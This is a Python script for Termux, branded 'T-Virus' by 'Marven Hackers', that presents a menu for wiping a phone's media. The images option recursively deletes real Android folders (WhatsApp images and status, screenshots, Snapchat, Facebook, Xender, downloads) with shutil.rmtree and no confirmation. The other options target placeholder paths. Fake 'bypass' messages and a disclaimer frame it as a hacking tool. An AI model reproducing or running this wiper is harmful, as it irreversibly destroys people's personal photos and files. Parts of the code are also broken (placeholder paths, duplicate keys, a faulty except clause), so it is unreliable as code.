import pyfiglet
import shutil,os
from time import sleep
import colorama
from colorama import *
print(Fore.YELLOW+Style.BRIGHT)
print("-----------------------------------------------------")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("-----------------------------------------------------")
text="Shutdown"
tx=pyfiglet.figlet_format(text)
print(tx)
print("-----------------------------------------------------")
print("+++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("-----------------------------------------------------")
print(Back.CYAN)
print("\n")
ds="Shutdown"+"\n"+"Downloads"
print(Back.RED,"......Termux Tool Created By Marven Hackers.........\n")
print(Back.CYAN,".You are thereby",Back.RED,"using this tool at",Back.GREEN,"your own risk.\n")
print("Am not responsible",Back.RED,"for any harmful use",Back.GREEN,"of this tool")
print(Back.RESET)
sleep(2)
print(Fore.CYAN+Style.BRIGHT)
var1="-----------> Clear All Images\n"
var2="-----------> Clear All Audio\n"
var3="-----------> Clear All Video\n"
var4="-----------> Clear All Downloads\n"
tv ="T-Virus"
var5="-----------> Clean your sdcard"
var0="--------------> Choose Any Option<--------------"
print(var0)
print("\n")
sdc="Shutdown"+"\n"+"Sdcard"
print("\n")
print("1.",var1)
print("2.",var2)
print("3.",var3)
print("4.",var4)
print("5.",var5)
vd="Videos"
print("\n")
while True:
	user=input(" =============> ")
	if user =="1":
		print("\n")
		print("\n")
		print("\n")
		tex="Shutdown"
		te="Images"
		print(pyfiglet.figlet_format(tex+"\n"+te))
		print("\n")
		sleep(2.3)
		for delete in range(1,6):
			sleep(1.8)
			print("  Successfully bypass your files...")
			print("  Attempting to delete all images......")
			print("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n")
		image_dict={
		"status":"/storage/emulated/0/Android/media/com.transsion.phoenix/WhatsAPP/Status/",
		"screenshot":"/storage/emulated/0/Pictures/Screenshots/",
		"xender":"/storage/emulated/0/Xender/image/",
		"facebook":"/storage/emulated/0/Pictures/facebook/",
		"whatsapp":"/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/",
		"downloads":"/storage/7F55-130B/Download/",
		"snapchat":"/storage/emulated/0/DCIM/Snapchat/"}
		for val in image_dict:
			try:
				shutil.rmtree(image_dict[val])
			except FileNotFoundError:
				pass
		print(Back.BLUE)
		print("successfully deleted all  pictures in your file")
		print(Back.RESET)
		sleep(8.5)
		print()
		print()
		print("\n")
		print("\n")
		print(Fore.GREEN+Style.BRIGHT)
		print(pyfiglet.figlet_format(tv))
		print("\n")
		print(var0)
		print("\n")
		print("\n")
		print("1.",var1)
		print("2.",var2)
		print("3.",var3)
		print("4.",var4)
		print("5.",var5)
		print("\n")
	elif user =="2":
		print("\n")
		print("\n")
		print("\n")
		tt="Shutdown"
		ty="Audios"
		print(pyfiglet.figlet_format(tt+"\n"+ty))
		print("\n")
		print("\n")
		for hack in range(1,6):
			sleep(1)
			print("-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+\n")
			sleep(0.8)
			print("Allowing termux to access files")
			print("-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n")
			sleep(1.9)
			print("Crawling on your  audio folders ...\/\/\/\/\/\/\/\/\/")
			print("-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-++\n" "\n")
		sleep(4)
		Audio_dict={
		"audio":"path",
		"audio":"path",
		"audio":"path",
		"audio":"path",
		"audio":"path",}
		for var66 in Audio_dict:
			try:
				shutil.rmtree(Audio_dict[var66])
			except FileNotFoundError:
				pass
		sleep(4)
		print()
		print(Back.RED)
		print("      Successfully moved your audio to trash")
		print(Back.RESET)
		sleep(7.8)
		print()
		print()
		print("\n")
		print("\n")
		print(Fore.YELLOW+Style.BRIGHT)
		print(pyfiglet.figlet_format(tv))
		print("\n")
		print(var0)
		print("\n")
		print("\n")
		print("1.",var1)
		print("2.",var2)
		print("3.",var3)
		print("4.",var4)
		print("5.",var5)
		print("\n")
	elif user =="3":
		print("\n")
		print("\n")
		print("\n")
		print(pyfiglet.figlet_format(text+"\n"+vd))
		print("\n")
		for video in range(1,5):
			sleep(1.3)
			print(" Selecting videos in your files...")
			print(" Attempting to delete all videos...")
			print("×××××××××××××××××××××××××××××××××××××××××××××××××××××\n")
		videos_dict={
		    "camera":"path",
		    "xender":"path",
		    "whatsapp":"path",
		    "downloads":"path"}
		for values in videos_dict:
			try:
				shutil.rmtree(videos_dict[values])
			except FileNotFoundError:
				pass
		print(Back.RED,"  Successfully deleted all videos in your file...",Back.RESET,"\n")
		sleep(6.9)
		print("\n")
		print("\n")
		print(pyfiglet.figlet_format(tv))
		print("\n")
		print("\n")
		print("\n")
		print(var0)
		print("\n")
		print("\n")
		print("1.",var1)
		print("2.",var2)
		print("3.",var3)
		print("4.",var4)
		print("5.",var5)
		print("\n")
	elif user =="4":
		print()
		print("\n")
		print("\n")
		print("\n")
		print()
		print(pyfiglet.figlet_format(ds))
		print("\n")
		print()
		print("\n")
		for downloads in range(1,5):
			sleep(1.2)
			print(" unpacking empty downloads")
			sleep(1.4)
			print("*****************************************************\n")
			print(" Loading new downloads from files...")
			sleep(0.2)
			print(" Processing new downloads from files....\n")
		dls_dict={
		"diwnloads":"path",
		"downloads":"path",
		"downloads":"path"}
		for path in dls_dict:
			try:
				shutil.rmtree(dls_dict[path])
			except FileNotFoundError:
				pass
		print(Back.RED," Successfully deleted all downloads in your file...",Back.RESET)
		sleep(8.8)
		print("\n")
		print("\n")
		print(pyfiglet.figlet_format(tv))
		print("\n")
		print()
		print("\n")
		print(var0)
		print("\n")
		print("\n")
		print("1.",var1)
		print("2.",var2)
		print("3.",var3)
		print("4.",var4)
		print("5.",var5)
		print("\n")
	elif user == "5":
		print("\n")
		print("\n")
		print("\n")
		print()
		print(Fore.RED)
		print(pyfiglet.figlet_format(sdc))
		print()
		sleep(2.2)
		print("\n")
		print("\n")
		print("\n")
		for sdcard in range(1,5):
			sleep(2.2)
			print("Formating sdcard...")
			sleep(0.3)
			print("From memory, deleting sdcard contents\n")
			print("•••••••••••••••••••••••••••••••••••••••••••••••••••••")
		try:
			shutil.rmtree("path")
		except FileNotFoundError and OSError:
			pass
		try:
			shutil.rmtree("path")
		except FileNotFoundError and OSError:
			pass
		print(Fore.WHITE+Style.BRIGHT)
		print(Back.RED,"Successfully cleaned your sdcard",Back.RESET)
		print(Fore.RESET)
		print(Fore.GREEN+Style.BRIGHT)
		sleep(6.8)
		print(pyfiglet.figlet_format(tv))
		print()
		print("\n")
		print("\n")
		print("\n")
		print(var0)
		print("\n")
		print("\n")
		print("1.",var1)
		print("2.",var2)
		print("3.",var3)
		print("4.",var4)
		print("5.",var5)
		print("\n")
	elif user =="":
		print(" please Enter A Valid Option(enter 'q' to quit)\n")
	elif user =="q":
		print("\nthanks for using my tool...\n")
		sleep(1.8)
		print("You are about to exit ....\n","bye!!")
		sleep(4.9)
		break
	else:
		print("\nMarven Hackers is not blamed for your foolishness" +"\n"+ "(enter 'q' to quit idiot)\n")
